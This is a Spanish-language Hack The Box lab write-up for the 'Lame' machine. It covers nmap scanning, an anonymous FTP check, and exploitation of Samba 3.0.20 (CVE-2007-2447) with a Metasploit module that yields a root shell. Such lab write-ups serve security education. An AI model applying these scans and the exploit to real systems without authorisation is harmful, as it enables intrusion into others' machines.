# 🏴 Writeup — Lame

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 10.129.15.38
> **💀 Dificultad:** Fácil
> **🌐 Plataforma:** Hack The Box
> **📅 Fecha:** 03-03-2026
> **✅ Pwned:** 🟢 Sí

---

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración, lanzamos un ping para verificar conectividad con la máquina objetivo. Además del simple echo reply, aprovecharemos el valor del **TTL** para intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```python
> ping -c 1 10.129.15.38
> ```
>
> `-c 1` — Envía **un único paquete ICMP** y termina, en lugar de pingear indefinidamente.
> `10.129.15.38` — **IP objetivo** a la que se lanza el ping.

![](assets/Lame-img-03-03-2026.png)

Como se puede observar en el output, obtenemos respuesta con un TTL de **63**, lo que nos indica que estamos ante una máquina **Linux**. Confirmada la conectividad, procedemos con la enumeración.

### 👁️ Enumeración con NMAP

#### Enumeración de puertos

Comenzamos la fase de enumeración identificando qué puertos se encuentran abiertos en la máquina objetivo. Para ello utilizamos nmap en su modalidad de SYN Scan, que nos permite realizar un escaneo rápido y sigiloso sobre el rango completo de puertos sin completar el three-way handshake.

> [!tip] Escaneo de puertos completo y sigiloso
> ```python
> nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.15.38 -vvv -oN ports
> ```
>
> `-sS` — **SYN Scan** (half-open). Envía paquetes SYN sin completar el three-way handshake. Sigiloso y rápido, requiere root.
> `-p-` — Escanea los **65535 puertos** posibles.
> `--open` — Muestra **únicamente los puertos abiertos**, filtrando cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `10.129.15.38` — **IP objetivo** del escaneo.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `-oN ports` — Guarda el output en formato normal en un archivo llamado `ports`.

![](assets/Lame-img-03-03-2026-1.png)

El escaneo revela cinco puertos abiertos: **21 (FTP), 22 (SSH), 139 y 445 (SMB) y 3632 (DistCC)**. Una superficie de ataque variada que merece un análisis detallado de versiones.

---

#### Enumeración de versiones y servicios

Con los puertos abiertos identificados, lanzamos nmap con detección de versiones y scripts por defecto para determinar exactamente qué servicios y versiones están expuestos. Esta fase es crítica — conocer la versión exacta de cada servicio es lo que nos permitirá identificar vulnerabilidades concretas.

> [!tip] Detección de versiones y scripts sobre puertos seleccionados
> ```python
> nmap -sC -sV -p21,22,139,445,3632 --min-rate 5000 -n -Pn -vvv 10.129.15.38 -oN version
> ```
>
> `-sC` — Lanza los **scripts por defecto** del motor NSE de nmap.
> `-sV` — **Detección de versiones** de los servicios que corren en cada puerto.
> `-p21,22,139,445,3632` — Escanea **únicamente los puertos encontrados** en el paso anterior.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `10.129.15.38` — **IP objetivo** del escaneo.
> `-oN version` — Guarda el output en formato normal en un archivo llamado `version`.

![](assets/Lame-img-03-03-2026-2.png)
![](assets/Lame-img-03-03-2026-4.png)

Dos hallazgos inmediatos: el servicio FTP tiene el **login anónimo habilitado**, y el servicio Samba corre en su versión **3.0.20**. Ambos son señales de alerta que anotamos para investigar.

---

#### Enumeración de posibles vulnerabilidades

Con los servicios y versiones identificados, procedemos a lanzar los scripts de la categoría `vuln` de nmap para detectar vulnerabilidades conocidas de forma automática.

> [!tip] Detección automática de vulnerabilidades con scripts NSE
> ```python
> nmap --script vuln -p21,22,139,445,3632 --min-rate 5000 -n -Pn -vvv -oN vuln 10.129.15.38
> ```
>
> `--script vuln` — Lanza la categoría de scripts **vuln** del motor NSE, que comprueba vulnerabilidades conocidas en los servicios detectados.
> `-p21,22,139,445,3632` — Apunta únicamente a los **puertos ya identificados** anteriormente.
> `10.129.15.38` — **IP objetivo** del escaneo.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `-oN vuln` — Guarda el output en formato normal en un archivo llamado `vuln`.

![](assets/Lame-img-03-03-2026-5.png)

El escaneo confirma que el servicio **DistCC** en el puerto **3632** es vulnerable al **CVE-2004-2687** (CVSS 9.3). Sin embargo, tenemos un vector más directo y limpio: **Samba 3.0.20**. Antes de ir a la explotación, accedemos al FTP anónimo para descartar contenido relevante.

![](assets/Lame-img-03-03-2026-6.png)

El servidor FTP no contiene ningún archivo de interés. Descartado este vector, centramos el ataque en Samba.

---

## 💥 Explotación

> [!info] CVE-2007-2447 — Samba Username Map Script RCE
> Vulnerabilidad presente en **Samba 3.0.20 hasta 3.0.25rc3**. El fallo reside en la opción `username map script` del fichero de configuración `smb.conf`: cuando esta opción está activa, Samba pasa el nombre de usuario directamente al intérprete de shell sin sanitizarlo, lo que permite **inyectar comandos arbitrarios durante la autenticación** sin necesidad de credenciales válidas.
>
> **CVE:** CVE-2007-2447 | **CVSS:** 9.3 (High)
> **Afecta:** Samba 3.0.20 — 3.0.25rc3
> **Auth requerida:** Ninguna
> **Resultado:** RCE como el usuario que ejecuta el servicio Samba
> **Referencia:** [ExploitDB #16320](https://www.exploit-db.com/exploits/16320)
> **Módulo Metasploit:** `exploit/multi/samba/usermap_script`

Durante la enumeración de versiones identificamos que el servicio **Samba** corre en su versión **3.0.20**, directamente en el rango vulnerable. Recurrimos a **Metasploit**, que dispone de un módulo dedicado con ranking **excellent** para esta vulnerabilidad.

![](assets/Lame-img-03-03-2026-7.png)

> [!tip] Explotar Samba 3.0.20 con el módulo usermap_script en Metasploit
> ```python
> search 3.0.20
> use exploit/multi/samba/usermap_script
> options
> set RHOSTS 10.129.15.38
> set LHOST 10.10.16.198
> run
> ```
>
> `search 3.0.20` — Busca módulos en Metasploit relacionados con la versión **Samba 3.0.20**.
> `use exploit/multi/samba/usermap_script` — Carga el módulo que explota **CVE-2007-2447** a través de la función `username map script`.
> `options` — Muestra los **parámetros requeridos** antes de ejecutar el módulo.
> `set RHOSTS` — Define la **IP de la máquina víctima** objetivo del exploit.
> `set LHOST` — Define la **IP del túnel VPN** de nuestra máquina atacante. Crítico configurarlo correctamente o el exploit no creará sesión.
> `run` — Ejecuta el módulo y lanza el exploit contra el objetivo.

El exploit completa con éxito y obtenemos una shell directamente como **root**. La máquina queda completamente comprometida desde el acceso inicial, sin necesidad de escalar privilegios.

![](assets/Lame-img-03-03-2026-8.png)

---

## 🔼 Escalada de Privilegios

El acceso inicial obtenido mediante la explotación de CVE-2007-2447 ya otorga una shell como **root** directamente, por lo que no es necesaria ninguna técnica de escalada adicional.

---

## 🏁 Flags

| Flag | Hash |
|------|------|
| 🧑 User | `...` |
| 👑 Root | `...` |

---

## 📝 Lecciones Aprendidas

> [!tip] Takeaways
> Lame ilustra perfectamente uno de los principios más importantes del pentesting: **la versión del software lo es todo**. Identificar que Samba corría en su versión 3.0.20 fue suficiente para comprometer la máquina de forma completa, sin técnicas complejas ni cadenas de exploits. El segundo aprendizaje clave es la importancia de **priorizar vectores correctamente**: aunque el escaneo `vuln` detectó CVE-2004-2687 en DistCC y el FTP tenía login anónimo habilitado, la enumeración de versiones nos señaló el camino más directo e impactante. Saber leer el output y elegir el vector adecuado es una habilidad tan crítica como saber ejecutar el exploit. Por último, esta máquina refuerza que el `LHOST` debe apuntar siempre a la **IP del túnel VPN** en entornos HTB — un detalle de configuración que puede arruinar una explotación perfecta si se pasa por alto.